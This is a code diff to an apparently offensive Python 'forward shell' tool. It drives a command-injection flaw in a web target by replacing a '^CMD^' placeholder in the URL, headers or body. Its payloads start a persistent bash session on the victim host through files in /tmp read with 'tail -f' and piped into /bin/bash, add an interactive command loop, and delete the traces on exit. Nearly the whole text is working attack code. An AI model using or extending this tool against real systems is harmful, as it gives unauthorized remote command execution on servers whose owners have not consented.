@@ -13,13 +13,14 @@ class WebShell():
     """
     Webshell that will handle the session
     """
-    def __init__(url, session, headers, proxies, interval, data):
+    def __init__(self, url, session, headers, proxies, interval, data, upgrade_shell=False):
         self.session = session
         self.url = url
         self.interval = interval
         self.data = data
         self.proxies = proxies
         self.headers = headers
+        self.upgrade_shell = upgrade_shell
 
         tmp_name = random.randrange(10000,99999)
         input_name = f"/tmp/in_{tmp_name}"
@@ -64,7 +65,7 @@ class WebShell():
         else:
             r = self.session.get(url, headers=headers, proxies=self.proxies)
 
-        payload = f"bash -c 'tail -f {input_name} | /bin/bash 2>&1 > {output_name} 2>&1'"
+        payload = f"bash -c 'tail -f {input_name} | /bin/bash 2>&1 > {output_name} 2>&1' &"
         
         url = self.url.replace("^CMD^", payload)
         headers = self.headers.replace("^CMD^", payload)
@@ -73,6 +74,48 @@ class WebShell():
             r = self.session.post(url, headers=headers, data=data, proxies=self.proxies)
         else:
             r = self.session.get(url, headers=headers, proxies=self.proxies)
+        
+    def endConnection(self):
+        payload = f"bash -c 'rm {self.input_name};rm {self.output_name}'; pkill -f 'tail -f {self.input_name}'"
+
+        url = self.url.replace("^CMD^", payload)
+        headers = self.headers.replace("^CMD^", payload)
+        if self.data:
+            data = self.data.replace("^CMD^", payload)
+            r = self.session.post(url, headers=headers, data=data, proxies=self.proxies)
+        else:
+            r = self.session.get(url, headers=headers, proxies=self.proxies)
+
+    def listenOutput(self):
+        while True:
+            print(self.recvOutput(), end="")
+            sleep(self.interval)
+
+    def run(self):
+        print("[+] Starting session")
+        self.createSession()
+        if self.upgrade_shell:
+            prompt = "cmd> "
+        else:
+            prompt = ""
+
+        # Listen for output thread
+        listen_thread = threading.Thread(target=self.listenOutput)
+        listen_thread.start()
+
+        # Main loop
+        while True:
+            cmd = input(prompt)
+            if cmd == "exit":
+                self.endConnection()
+                break
+            self.sendPayload(cmd)
+            print(self.recvOutput(), end="")
+        
+        print("[+] Ending session")
+        self.endConnection()
+        print("[+] Session ended")
+
 
 
 # EDIT THIS
@@ -113,6 +156,7 @@ def createPipeListen():
 
 
 def main():
+    """
     init = threading.Thread(target=createPipeListen, args=())
     init.start()
     print("basliye 5 sn")
@@ -134,6 +178,7 @@ def main():
 
     listenin_th = threading.Thread(target=lis_th, args=())
     listenin_th.start()
+    """
 
     """
     while True:
@@ -142,6 +187,7 @@ def main():
         print(recvOutput(), end='')
     """
 
+    """
     import cmd
 
     class Shell(cmd.Cmd):
@@ -158,6 +204,7 @@ def main():
 
 
     print("bitirmek gerek tmp silmek fln")
+    """
 
 
 argparser = argparse.ArgumentParser(description='Forward Shell')
@@ -218,6 +265,6 @@ if __name__ == "__main__":
         session.verify = False
 
     if args.upgrade:
-        print("TTY shell not implemented yet")
+        print("TTY shell not fully implemented yet")
 
     main()
